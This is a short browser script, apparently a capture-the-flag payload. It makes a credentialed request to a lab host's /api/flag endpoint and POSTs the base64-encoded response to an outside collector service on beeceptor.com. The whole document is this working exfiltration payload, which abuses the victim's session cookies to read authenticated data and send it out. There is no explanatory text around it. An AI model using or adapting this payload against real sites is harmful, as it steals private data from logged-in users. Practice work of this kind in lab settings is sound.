<script>
        var req = new XMLHttpRequest();
        var url = 'http://ctf.hackerlab.bj:5700'

        req.onload = retrieveKeys;
        req.onerror = retrieveKeys;

        req.open('GET', url + '/api/flag', true);
        req.withCredentials = true;
        req.send(null);
        function retrieveKeys() {
            fetch('https://metaa.free.beeceptor.com',{
                method: 'POST',
                body: btoa(req.responseText)
            })
        }
